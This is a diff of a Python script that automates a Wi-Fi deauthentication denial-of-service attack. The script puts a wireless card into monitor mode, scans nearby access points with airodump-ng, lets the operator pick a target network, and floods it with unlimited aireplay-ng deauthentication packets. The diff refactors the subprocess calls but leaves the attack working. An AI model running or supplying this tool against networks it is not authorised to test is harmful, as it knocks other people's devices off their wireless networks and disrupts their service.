@@ -2,6 +2,9 @@ from asyncio.subprocess import DEVNULL
 import subprocess, os, re, csv, time, shutil
 from datetime import datetime
 
+def command(cmd):
+    return cmd.split(' ')
+
 active_wireless_networks = []
 
 def check_for_essid(essid, lst):
@@ -68,17 +71,13 @@ while True:
 hacknic = scanned_nics[int(nic_index)]
 
 print(f"Killing intrusive system processes...")
-kill_conflicting_processes =  subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=DEVNULL)
+subprocess.run(command("sudo airmon-ng check kill"), stdout=DEVNULL)
 
-# Put wireless in Monitor mode
 print(f"Putting {hacknic} into monitored mode:")
-put_in_monitored_mode = subprocess.run(["sudo", "airmon-ng", "start", hacknic], stdout=DEVNULL)
+subprocess.run(command(f"sudo airmon-ng start {hacknic}"), stdout=DEVNULL)
 
-# subprocess.Popen(<list of command line arguments goes here>)
-# The Popen method opens a pipe from a command. 
-# The output is an open file that can be accessed by other programs.
 # Discover access points
-discover_access_points = subprocess.Popen(["sudo", "airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", hacknic + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+discover_access_points = subprocess.Popen(command(f"sudo airodump-ng -w file --write-interval 1 --output-format csv {hacknic}mon"), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 # Loop that shows the wireless access points. We use a try except block and we will quit the loop by pressing ctrl-c.
 try:
@@ -137,16 +136,15 @@ hackbssid = active_wireless_networks[int(choice)]["BSSID"]
 hackchannel = active_wireless_networks[int(choice)]["channel"].strip()
 
 # Change to the channel we want to perform the DOS attack on. 
-subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])
+subprocess.run(command(f"airmon-ng start {hacknic}mon {hackchannel}"), stdout=DEVNULL)
 
 try:
-    subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, scanned_nics[int(nic_index)] + "mon"])
+    subprocess.run(command(f"aireplay-ng --deauth 0 -a {hackbssid} {scanned_nics[int(nic_index)]}mon"))
 except KeyboardInterrupt:
     print(f"\nAttack halted.\nResetting {hacknic} to managed mode...")
-    subprocess.run(['airmon-ng', 'stop', hacknic+'mon'], stdout=DEVNULL)
+    subprocess.run(command(f"airmon-ng stop {hacknic}mon"), stdout=DEVNULL)
     print("Restarting NIC processes...")
-    subprocess.run(['sudo', 'systemctl', 'start', 'wpa_supplicant'])
-    subprocess.run(['sudo', 'systemctl', 'start', 'NetworkManager'])
+    subprocess.run(command("sudo systemctl start wpa_supplicant NetworkManager"))
 finally:
     print("Bye!")
 
